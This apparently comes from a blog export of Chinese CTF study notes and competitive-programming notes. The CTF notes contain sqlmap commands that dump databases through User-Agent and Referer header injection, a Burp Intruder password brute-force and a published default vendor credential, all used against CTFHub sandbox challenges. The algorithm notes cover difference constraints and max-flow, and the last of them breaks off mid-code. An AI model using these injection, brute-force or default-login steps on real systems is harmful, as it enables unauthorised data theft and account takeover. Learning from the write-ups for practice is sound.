<p>这时我们使用 brupsuite 抓包，并将信息存储在 <code>test.txt</code>
以备注入使用（<code>*</code> 表示指定注入的点）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: challenge-XXX.sandbox.ctfhub.com:XXXXX</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: *</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>
<p>于是我们可以用 sqlmap 分析抓包信息。设置 <code>--level 3</code>
并使用 <code>-p</code> 指定为 <code>User-Agent</code>
注入即可。执行代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r &quot;test.txt&quot; -p User-Agent --level 3 --dbs</span><br><span class="line">sqlmap -r &quot;test.txt&quot; -p User-Agent --level 3 -D sqli --tables</span><br><span class="line">sqlmap -r &quot;test.txt&quot; -p User-Agent --level 3 -D sqli -T swthkhjyyp --columns --dump</span><br></pre></td></tr></table></figure>
<h1 id="refer-注入">Refer 注入</h1>
<p>题目地址：CTFHub -&gt; 技能树 -&gt; Web -&gt; SQL 注入 -&gt; Refer
注入</p>
<p>我们使用 brupsuite 抓包，并未发现 Refer，于是可以自己构造
Refer（<code>*</code> 表示指定注入的点）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: challenge-XXX.sandbox.ctfhub.com:XXXXX</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Referer: id=1*</span><br></pre></td></tr></table></figure>
<p>于是我们可以用 sqlmap 分析抓包信息。设置 <code>--level 5</code>
并使用 <code>-p</code> 指定为 <code>referer</code>
注入即可。执行代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r &quot;test.txt&quot; -p referer --level 5 --dbs</span><br><span class="line">sqlmap -r &quot;test.txt&quot; -p referer --level 5 -D sqli --tables</span><br><span class="line">sqlmap -r &quot;test.txt&quot; -p referer --level 5 -D sqli -T vdcwkjvvjz --columns --dump</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>CTF</tag>
        <tag>Web</tag>
        <tag>SQL 注入</tag>
      </tags>
  </entry>
  <entry>
    <title>OIer 的 CTF Web 密码口令学习笔记</title>
    <url>/ctf-password-notes/</url>
    <content><![CDATA[<p>CTFer 就需要学会破解密码（大雾</p>
<p>本文一切例题均可在 <a href="https://www.ctfhub.com/">CTFHub</a>
找到。</p>
<span id="more"></span>
<h1 id="弱口令">弱口令</h1>
<p>题目地址：CTFHub -&gt; 技能树 -&gt; Web -&gt; 密码口令 -&gt;
弱口令</p>
<p>我们使用 brupsuite 抓包：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: challenge-XXX.sandbox.ctfhub.com:XXXXX</span><br><span class="line">Content-Length: 35</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://challenge-XXX.sandbox.ctfhub.com:XXXXX</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://challenge-XXX.sandbox.ctfhub.com:XXXXX/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">name=admin&amp;password=114514&amp;referer=</span><br></pre></td></tr></table></figure>
<p>在网上找一份弱口令表，然后我们针对密码进行爆破。在结果中找到长度不一的即可。</p>
<p>brupsuite 的用法可见 <a href="/ctf-web-notes/" title="该文章中的 HTTP 基本认证部分">该文章中的 HTTP 基本认证部分</a>。</p>
<p>最后可跑出来账户：admin，密码：admin666。登陆后即可获得 flag。</p>
<h1 id="默认口令">默认口令</h1>
<p>题目地址：CTFHub -&gt; 技能树 -&gt; Web -&gt; 密码口令 -&gt;
默认口令</p>
<p>根据网页界面，我们可得出为亿邮的网页。于是我们可以搜索亿邮的管理员手册及常用默认密码。使用默认密码登录即可。<a
href="https://www.cnblogs.com/bflw/p/12938013.html">该题的默认口令可在这篇文章中找到</a>。于是我们找到默认口令为用户名：eyougw，密码：admin@(eyou)。登录后即可获得
flag。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>CTF</tag>
        <tag>Web</tag>
        <tag>密码口令</tag>
      </tags>
  </entry>
  <entry>
    <title>OIer 的 CTF Web 基础知识学习笔记</title>
    <url>/ctf-web-notes/</url>
    <content><![CDATA[<p><del>由于某些原因某 OIer 零基础学习 CTF 被打爆了 QWQ</del></p>
<p>本文一切例题均可在 <a href="https://www.ctfhub.com/">CTFHub</a>
找到。</p>
<span id="more"></span>
<h1 id="http-请求方式">HTTP 请求方式</h1>
<p>HTTP 是一种协议，定义了客户端和服务端的请求规范。HTTP 默认使用 80
端口指向服务，而 HTTPS 协议的默认端口为 443。</p>
<p>HTTP 有下表中的八种方法：</p>
<table>
<thead>
<tr class="header">
<th>方法</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>GET</code></td>
<td>请求获取指定页面的实体数据</td>
</tr>
<tr class="even">
<td><code>HEAD</code></td>
<td>请求获取指定页面的头信息</td>
</tr>
<tr class="odd">
<td><code>POST</code></td>
<td>向指定资源提交数据进行数据请求</td>
</tr>
<tr class="even">
<td><code>PUT</code></td>
<td>传输数据取代指定文档的内容</td>
</tr>
<tr class="odd">
<td><code>DELETE</code></td>
<td>请求删除指定页面</td>
</tr>
<tr class="even">
<td><code>OPTIONS</code></td>
<td>允许查看服务器性能</td>
</tr>
<tr class="odd">
<td><code>TRACE</code></td>
<td>返回服务器收到的请求</td>
</tr>
</tbody>
</table>
<h2 id="例题">例题</h2>
<p>题目地址：CTFHub -&gt; 技能树 -&gt; Web -&gt; Web 前置技能 -&gt; HTTP
协议 -&gt; 请求方式</p>
<p>翻译一下题意。这道题指定了新的 HTTP 方法
<code>CTFHUB</code>，要求我们使用 <code>CTFHUB</code> 方法获得
flag。</p>
<h3 id="curl-介绍"><code>curl</code> 介绍</h3>
<p>该题可在终端中使用 <code>curl</code> 指令获取 flag。<code>curl</code>
是一个终端中请求 Web
服务器的工具。常用方法如下表（无参数时直接返回网页源码）：</p>
<table>
<thead>
<tr class="header">
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>-i</code></td>
<td>额外获取头信息</td>
</tr>
<tr class="even">
<td><code>-I</code></td>
<td>仅获取头信息</td>
</tr>
<tr class="odd">
<td><code>-v</code></td>
<td>获取更为详细的信息</td>
</tr>
<tr class="even">
<td><code>-X &lt;command&gt;</code></td>
<td>指定 <code>&lt;command&gt;</code> 命令</td>
</tr>
<tr class="odd">
<td><code>-L</code></td>
<td>HTTP 请求跟随重定向（<code>curl</code> 默认不重定向）</td>
</tr>
</tbody>
</table>
<p>这道题使用 <code>curl</code> 情况如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xenonwzh@XenonWZH-Surface:~$ curl -v -X CTFHUB http://challenge-XXX.sandbox.ctfhub.com:XXXXX/index.php</span><br><span class="line">*   Trying XXX.XXX.XXX.XXX:XXXXX...</span><br><span class="line">* TCP_NODELAY set</span><br><span class="line">* Connected to challenge-XXX.sandbox.ctfhub.com (XXX.XXX.XXX.XXX) port XXXXX (#0)</span><br><span class="line">&gt; CTFHUB /index.php HTTP/1.1</span><br><span class="line">&gt; Host: challenge-XXX.sandbox.ctfhub.com:XXXXX</span><br><span class="line">&gt; User-Agent: curl/7.68.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt;</span><br><span class="line">* Mark bundle as not supporting multiuse</span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; Server: openresty/1.19.3.2</span><br><span class="line">&lt; Date: Sat, 21 Jan 2023 14:05:43 GMT</span><br><span class="line">&lt; Content-Type: text/html; charset=UTF-8</span><br><span class="line">&lt; Transfer-Encoding: chunked</span><br><span class="line">&lt; Connection: keep-alive</span><br><span class="line">&lt; X-Powered-By: PHP/5.6.40</span><br><span class="line">&lt; Access-Control-Allow-Origin: *</span><br><span class="line">&lt; Access-Control-Allow-Headers: X-Requested-With</span><br><span class="line">&lt; Access-Control-Allow-Methods: *</span><br><span class="line">&lt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;/&gt;</span><br><span class="line">    &lt;title&gt;CTFHub HTTP Method&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">good job! ctfhub&#123;XXXXXX&#125;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">* Connection #0 to host challenge-XXX.sandbox.ctfhub.com left intact</span><br></pre></td></tr></table></figure>
<p>于是我们就可以获取 flag 了。</p>
<h1 id="http-302-跳转临时重定向">HTTP 302 跳转（临时重定向）</h1>
<p>当服务器无法处理收到的请求时，服务器会告诉浏览器跳转到一个可以处理该请求的
URL 上。重定向的返回码为 3XX。Location
相应首部包含了内容新地址或者优先地址的 URL。</p>
<p>返回码的意义如下表：</p>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th>返回码</th>
<th>意义</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>301</td>
<td>请求的 URL 已被移除时使用，Location 首部包含所在资源的
URL（永久性转移）</td>
</tr>
<tr class="even">
<td>302</td>
<td>该请求 URL 转移，将来的请求仍使用老的 URL，Location 首部给出 URL
临时定位资源（暂时性转移）</td>
</tr>
</tbody>
</table>
<h2 id="例题-1">例题</h2>
<p>题目地址：CTFHub -&gt; 技能树 -&gt; Web -&gt; Web 前置技能 -&gt; HTTP
协议 -&gt; 302 跳转</p>
<p>我们可以通过开发工具 -&gt; 网络中找到状态为 302 的链接。</p>
<img src="/ctf-web-notes/302.png" class="">
<p>使用 <code>curl</code>
可以看到这个链接中因重定向而没看到的内容（<code>curl</code>
默认不跟随重定向）。</p>
<p>于是我们可以得到下列信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xenonwzh@XenonWZH-Surface:~$ curl http://challenge-XXX.sandbox.ctfhub.com:XXXXX/index.php</span><br><span class="line">ctfhub&#123;XXXXXX&#125;</span><br></pre></td></tr></table></figure>
<p>于是就获得了 flag。</p>
<h1 id="cookie">Cookie</h1>
<p>Cookie
是浏览器存储在本地的一种数据，可让服务器确定当前请求的用户的身份。Cookie
数据量一般不超过 4KB，所以 Cookie 只能存储少量数据。</p>
<h2 id="例题-2">例题</h2>
<p>题目地址：CTFHub -&gt; 技能树 -&gt; Web -&gt; Web 前置技能 -&gt; HTTP
协议 -&gt; Cookie</p>
<p>题意翻译一下即使用 admin 登录获取 flag。</p>
<h3 id="brupsuite">brupsuite</h3>
<p>brupsuite 是一个渗透测试工具，且 Kali Linux
自带。这个工具可以抓包改包。使用这个工具，我们首先需要在浏览器中设置
HTTP 代理为 <code>127.0.0.1:8080</code>，开启工具后我们点击 Proxy -&gt;
Intercept -&gt; Intercept is on 即可拦截请求。该题网站的请求如下：</p>
<img src="/ctf-web-notes/cookie.png" class="">
<p>于是我们只需要修改 <code>admin=1</code>，然后点击 Forward
完成改包，就修改了 Cookie 中的 <code>admin</code>
项了。于是我们就可以在网站上看到 flag 了（看不到刷新即可）。</p>
<h1 id="http-基本认证">HTTP 基本认证</h1>
<p>在 HTTP 中，HTTP 基本认证是允许 HTTP
用户代理（如浏览器）在请求时，提供用户和密码的一种方式。</p>
<p>在认证时，请求的 HTTP 头字段会包含
<code>Authorization: Basic &lt;凭证&gt;</code>
的信息。凭证为用户名和密码组合的 base64 编码。</p>
<h2 id="例题-3">例题</h2>
<p>题目地址：CTFHub -&gt; 技能树 -&gt; Web -&gt; Web 前置技能 -&gt; HTTP
协议 -&gt; 基本认证</p>
<p>本题要求登录 admin 账户以获取 flag，且提供了可能的多种密码。</p>
<p>我们可以先用 brupsuit
抓个包，抓包方法同上一题。输入密码后我们可以看到
<code>Authorization ：Basic XXX</code> 数据，且 <code>XXX</code> 为
base64 编码。我们将其解码可发现 <code>admin:&lt;密码&gt;</code>
的字样，这正是我们需要爆破的地方。我们可以点击 Action -&gt; Send to
Intruder 将数据传至测试器。</p>
<p>于是我们可在测试器中选择要爆破的数据，选择数据后点击
Add，方法如下图：</p>
<img src="/ctf-web-notes/intruder.png" class="">
<p>接着我们点 Payloads 选择需要爆破的内容。在 Payload Options
可以添加爆破的字符串的字典，例如这里可能的密码。在 Paylod Processing
可添加爆破的过程，例如这里我们可以选择添加 <code>admin:</code>
前缀，将整个字符串使用 base64 加密。操作效果如下图：</p>

<p>最后点击 Start attack 即可爆破。爆破完成后状态码为 200
的请求即使用了正确的密码。于是我们选择状态 200 的请求，提取出其中被
base64 加密的密码，解密输入网站中即可获得 flag。获得的请求如下图：</p>
<img src="/ctf-web-notes/attack.png" class="">
<h1 id="http-响应包源代码">HTTP 响应包源代码</h1>
<p>没啥好讲的，浏览器直接按 F12 或右键 -&gt;
查看网页源代码即可看到源代码。</p>
<h2 id="例题-4">例题</h2>
<p>题目地址：CTFHub -&gt; 技能树 -&gt; Web -&gt; Web 前置技能 -&gt; HTTP
协议 -&gt; 响应包源代码</p>
<p>直接在浏览器中按 F12 即可看到 flag。情况如下图：</p>
<img src="/ctf-web-notes/source.png" class="">
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>CTF</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>差分约束学习笔记</title>
    <url>/differential-constraints-notes/</url>
    <content><![CDATA[<h1 id="概念">概念</h1>
<p>差分约束指的是一种 <span class="math inline">\(n\)</span>
元一次不等式组。令有 <span class="math inline">\(n\)</span> 个未知数
<span class="math inline">\(x_1, x_2, \cdots, x_n\)</span>，<span
class="math inline">\(m\)</span> 个形如 <span class="math inline">\(x_i
- x_j \leq c_k\)</span>
不等式，利用差分约束我们可以求出满足条件的解，或判断无解。</p>
<span id="more"></span>
<h1 id="实现方法">实现方法</h1>
<h2 id="模型转化">模型转化</h2>
<p>我们先观察 Bellman-Ford
最短路算法。该算法有松弛操作（<code>w(u, v)</code> 指的是边 <span
class="math inline">\(&lt;u, v&gt;\)</span> 的权值）
<code>dis[v] = std::min(dis[v], dis[u] + w(u, v))</code>，故在最短路种必定满足
<span class="math inline">\(dis[v] \leq dis[u] + w(u,
v)\)</span>，转化一下即为 <span class="math inline">\(dis[v] - dis[u]
\leq w(u, v)\)</span>。</p>
<p>观察该不等式与差分约束的关系，可把差分约束中 <span
class="math inline">\(x_i - x_j \leq c_k\)</span> 转化为边权为 <span
class="math inline">\(c_k\)</span>，连通 <span
class="math inline">\(&lt;j, i&gt;\)</span>
的有向边。利用此方法可将差分约束转化为图上单源最短路问题。</p>
<h2 id="求解">求解</h2>
<p>由于通过转化权值可能为负，我们可使用 Bellman-Ford 或 SPFA 算法。</p>
<p>首先对于不等式 <span class="math inline">\(x_i - x_j \leq
c_k\)</span>，在点 <span class="math inline">\(j\)</span> 与点 <span
class="math inline">\(i\)</span> 中连一条权值为 <span
class="math inline">\(c_k\)</span> 的边。</p>
<p>由于没有确定的起始点，我们需要再新建一个超级源点，且使超级源点和所有点相连，相连的边的权值均设为
<span class="math inline">\(0\)</span>。</p>
<p>最后通过 Bellman-Ford 或
SPFA，求出超级源点的单源最短路。最后求出的单源最短路 <span
class="math inline">\(\left \{ dis_1, dis_2, \cdots, dis_n \right
\}\)</span> 即为所求解。若图中出现负环，则无解。</p>
<p>注意对于任意常数 <span class="math inline">\(r\)</span>，<span
class="math inline">\(\left \{ dis_1 + r, dis_2 + r, \cdots, dis_n + r
\right \}\)</span> 由于在差分约束中 <span
class="math inline">\(r\)</span> 在运算中会被抵消，故也为所求解。</p>
<h1 id="常见转化">常见转化</h1>
<p>摘自 OI-wiki</p>
<table>
<colgroup>
<col style="width: 21%" />
<col style="width: 43%" />
<col style="width: 34%" />
</colgroup>
<thead>
<tr class="header">
<th>公式</th>
<th>转化</th>
<th>连边</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><span class="math inline">\(x_a - x_b \geq c\)</span></td>
<td><span class="math inline">\(x_b - x_a \leq -c\)</span></td>
<td><code>add(a, b, -c)</code></td>
</tr>
<tr class="even">
<td><span class="math inline">\(x_a - x_b \leq c\)</span></td>
<td><span class="math inline">\(x_a - x_b \leq c\)</span></td>
<td><code>add(b, a, c)</code></td>
</tr>
<tr class="odd">
<td><span class="math inline">\(x_a = x_b\)</span></td>
<td><span class="math inline">\(x_a - x_b \leq 0, x_b - x_a \leq
0\)</span></td>
<td><code>add(b, a, 0), add(a, b, 0)</code></td>
</tr>
</tbody>
</table>
<h1 id="例题">例题</h1>
<p><a href="https://www.luogu.com.cn/problem/P1993">洛谷 P1993 小 K
的农场</a></p>
<p>显然这是道差分约束的题，同时对输入的三种情况简单地用上述方法转换一下即可。</p>
<p>代码如下（注意开 O2）：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">10000</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line">std::vector&lt; std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &gt; e[MAXN + <span class="number">1</span>];</span><br><span class="line"><span class="type">int</span> dis[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">bf</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">bool</span> con;</span><br><span class="line">    <span class="built_in">memset</span>(dis, <span class="number">0x3f</span>, <span class="built_in">sizeof</span>(dis));</span><br><span class="line">    dis[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        con = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= n; j++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> each : e[j]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (dis[each.first] &gt; dis[j] + each.second) &#123;</span><br><span class="line">                    dis[each.first] = dis[j] + each.second;</span><br><span class="line">                    con = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!con) <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> con;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> m;</span><br><span class="line"></span><br><span class="line">    std::cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, op, a, b, c; i &lt; m; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;op);</span><br><span class="line">        <span class="keyword">if</span> (op == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;a, &amp;b, &amp;c);</span><br><span class="line">            e[a].<span class="built_in">push_back</span>( std::<span class="built_in">make_pair</span>(b, -c) );</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (op == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;a, &amp;b, &amp;c);</span><br><span class="line">            e[b].<span class="built_in">push_back</span>( std::<span class="built_in">make_pair</span>(a, c) );</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line">            e[a].<span class="built_in">push_back</span>( std::<span class="built_in">make_pair</span>(b, <span class="number">0</span>) );</span><br><span class="line">            e[b].<span class="built_in">push_back</span>( std::<span class="built_in">make_pair</span>(a, <span class="number">0</span>) );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将0作为超级源点</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) e[<span class="number">0</span>].<span class="built_in">push_back</span>( std::<span class="built_in">make_pair</span>(i, <span class="number">0</span>) );</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; (<span class="built_in">bf</span>() ? <span class="string">&quot;No&quot;</span> : <span class="string">&quot;Yes&quot;</span>) &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>学习笔记</tag>
        <tag>图论</tag>
        <tag>最短路</tag>
        <tag>差分约束</tag>
      </tags>
  </entry>
  <entry>
    <title>「网络流 24 题」飞行员配对方案 - 最大流</title>
    <url>/flow-fly/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P2756">洛谷连接</a></p>
<p>一共有 <span class="math inline">\(n\)</span> 个飞行员，其中有 <span
class="math inline">\(m\)</span> 个外籍飞行员和 <span
class="math inline">\((n - m)\)</span>
个英国飞行员，<strong>外籍飞行员从 <span
class="math inline">\(1\)</span> 到 <span
class="math inline">\(m\)</span> 编号</strong>，<strong>英国飞行员从
<span class="math inline">\(m + 1\)</span> 到 <span
class="math inline">\(n\)</span> 编号</strong>。
对于给定的外籍飞行员与英国飞行员的配合情况，试设计一个算法找出最佳飞行员配对方案，使皇家空军一次能派出最多的飞机。</p>
<p>对于 <span class="math inline">\(100\%\)</span> 的数据，保证 <span
class="math inline">\(1 \leq m \leq n &lt; 100\)</span>，<span
class="math inline">\(1 \leq u \leq m &lt; v \leq
n\)</span>，同一组配对关系只会给出一次。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>显然二分图匹配问题，可用 Dinic 解决。</p>
<p>我们将源点连向所有外籍飞行员，权值为 <span
class="math inline">\(1\)</span>；将所有英国飞行员连向汇点，权值为 <span
class="math inline">\(1\)</span>；将外籍飞行员连向英国飞行员，权值为
<span
class="math inline">\(+\infty\)</span>。然后跑一边最大流就可得出答案了。</p>
<p>对于求匹配方案，我们只需要看外籍飞行员连向英国飞行员的边有没有经过的流量即可。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;climits&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span> &#123;</span><br><span class="line">    std::vector&lt;<span class="keyword">struct</span> Edge&gt; e;</span><br><span class="line">    std::vector&lt;<span class="keyword">struct</span> Edge&gt;::iterator c;</span><br><span class="line">    <span class="type">int</span> id, l;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Edge</span> &#123;</span><br><span class="line">    Node *s, *t;</span><br><span class="line">    <span class="type">int</span> c, f, r;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Edge</span>(Node *s, Node *t, <span class="type">int</span> c, <span class="type">int</span> r) : <span class="built_in">s</span>(s), <span class="built_in">t</span>(t), <span class="built_in">c</span>(c), <span class="built_in">f</span>(<span class="number">0</span>), <span class="built_in">r</span>(r) &#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">void</span> <span class="title">addEdge</span><span class="params">(Node *s, Node *t, <span class="type">int</span> c)</span> </span>&#123;</span><br><span class="line">    s-&gt;e.<span class="built_in">emplace_back</span>(s, t, c, t-&gt;e.<span class="built_in">size</span>());</span><br><span class="line">    t-&gt;e.<span class="built_in">emplace_back</span>(t, s, <span class="number">0</span>, s-&gt;e.<span class="built_in">size</span>() - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Dinic</span> &#123;</span><br><span class="line">    std::vector&lt;Node&gt; &amp;nodes;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Dinic</span>(std::vector&lt;Node&gt; &amp;nodes) : <span class="built_in">nodes</span>(nodes) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">level</span><span class="params">(Node *s, Node *t, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            nodes[i].c = nodes[i].e.<span class="built_in">begin</span>();</span><br><span class="line">            nodes[i].l = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        std::queue&lt;Node *&gt; q;</span><br><span class="line">        q.<span class="built_in">push</span>(s);</span><br><span class="line"></span><br><span class="line">        s-&gt;l = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (!q.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            Node *u = q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;[u, v, c, f, r] : u-&gt;e) &#123;</span><br><span class="line">                <span class="keyword">if</span> (f &lt; c &amp;&amp; !v-&gt;l) &#123;</span><br><span class="line">                    v-&gt;l = u-&gt;l + <span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">if</span> (v == t) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="keyword">else</span> q.<span class="built_in">push</span>(v);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(Node *s, Node *t, <span class="type">int</span> limit = INT_MAX)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (s == t) <span class="keyword">return</span> limit;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;e = s-&gt;c; e != s-&gt;e.<span class="built_in">end</span>(); e++) &#123;</span><br><span class="line">            <span class="keyword">auto</span> &amp;[u, v, c, f, r] = *e;</span><br><span class="line">            <span class="keyword">if</span> (f &lt; c &amp;&amp; v-&gt;l == s-&gt;l + <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="type">int</span> flow = <span class="built_in">find</span>(v, t, std::<span class="built_in">min</span>(limit, c - f));</span><br><span class="line">                <span class="keyword">if</span> (flow) &#123;</span><br><span class="line">                    f += flow;</span><br><span class="line">                    